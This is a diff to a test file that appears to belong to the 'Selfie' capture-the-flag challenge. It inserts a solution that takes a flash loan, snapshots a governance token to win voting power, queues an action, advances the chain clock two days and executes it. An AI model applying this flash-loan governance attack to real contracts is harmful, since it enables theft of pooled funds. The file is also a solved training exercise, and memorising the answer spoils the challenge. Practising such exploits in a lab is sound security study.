@@ -38,7 +38,16 @@ describe('[Challenge] Selfie', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // The token used in governance is a snapshot token which can be easily attacked.
+        // Create a flashloan then take a snapshot, then you will be the owner of governance.
+        const attacker = await (await ethers.getContractFactory('SelfieAttacker', player)).deploy(
+            governance.address,
+            token.address,
+            pool.address
+        );
+        await attacker.attack();
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+        await governance.executeAction(1);
     });
 
     after(async function () {
